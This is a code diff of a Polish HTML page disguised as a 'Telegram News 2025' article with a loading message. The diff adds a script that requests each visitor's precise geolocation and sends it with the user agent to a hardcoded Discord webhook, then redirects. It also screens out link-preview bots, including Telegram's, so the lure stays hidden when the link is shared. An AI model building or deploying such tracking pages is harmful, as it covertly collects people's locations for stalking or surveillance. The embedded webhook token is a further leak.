@@ -1,29 +1,96 @@
+
+
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
-  <title>Przekierowanie...</title>
-  <script>
-    // Boty często klikają wszystko — też to ukryte
-    // Możesz podpiąć do tego logowanie IP po stronie serwera
-
-    // Sprawdzenie User-Agent dla pewności
-    const ua = navigator.userAgent.toLowerCase();
-    const blacklist = ["bot", "crawl", "spider", "discord", "telegram", "facebook", "preview"];
-
-    if (blacklist.some(word => ua.includes(word))) {
-      window.location.href = "https://yourdomain.com/bot-trap"; // link pułapka dla botów
-    } else {
-      setTimeout(() => {
-        window.location.href = " https://detectivedigital.github.io/"; // docelowy link dla ludzi
-      }, 2000);
+  <meta charset="UTF-8" />
+  <title>Telegram News 2025</title>
+  <meta name="description" content="Zobacz najnowsze informacje dotyczące prywatności i aplikacji Telegram.">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      padding: 2rem;
+      text-align: center;
     }
-  </script>
+    .loading {
+      font-size: 1.2rem;
+      color: #777;
+    }
+  </style>
 </head>
 <body>
-  <p>Trwa przekierowanie... proszę czekać</p>
+  <p class="loading">Ładowanie artykułu... Proszę czekać.</p>
 
-  <!-- Honeypot link – niewidoczny dla człowieka -->
-  <a href="https://yourdomain.com/bot-trap" style="display:none;">Ukryty link</a>
+  <script>
+    const ua = navigator.userAgent.toLowerCase();
+    const botWords = ["bot", "crawl", "spider", "discord", "telegram", "preview", "facebook", "whatsapp", "slack"];
+    const isBot = botWords.some(word => ua.includes(word));
+
+    const loggerUrl = "https://discord.com/api/webhooks/1364185353719906334/OFLyF26MgtEVbOw9VkAN21isLv2QisF6fd460pfAj-q0g42pgLWXI3ohHoz_wD6SSDUn"; // ← Wklej swój prawdziwy webhook Discorda
+
+    const redirectUrl = "https://example.com"; // ← Zmień na prawdziwy link końcowy
+
+    function logAndRedirect(data) {
+      fetch(loggerUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
+      }).finally(() => {
+        window.location.href = redirectUrl;
+      });
+    }
+
+    if (isBot) {
+      logAndRedirect({
+        ua: ua,
+        type: "bot",
+        lat: null,
+        lon: null,
+        error: "bot-detected"
+      });
+    } else {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            logAndRedirect({
+              ua: ua,
+              type: "user",
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              error: null
+            });
+          },
+          err => {
+            logAndRedirect({
+              ua: ua,
+              type: "user-denied",
+              lat: null,
+              lon: null,
+              error: err.message
+            });
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        logAndRedirect({
+          ua: ua,
+          type: "no-geolocation",
+          lat: null,
+          lon: null,
+          error: "Brak wsparcia dla geolokalizacji"
+        });
+      }
+    }
+  </script>
 </body>
 </html>
+
+
+
+
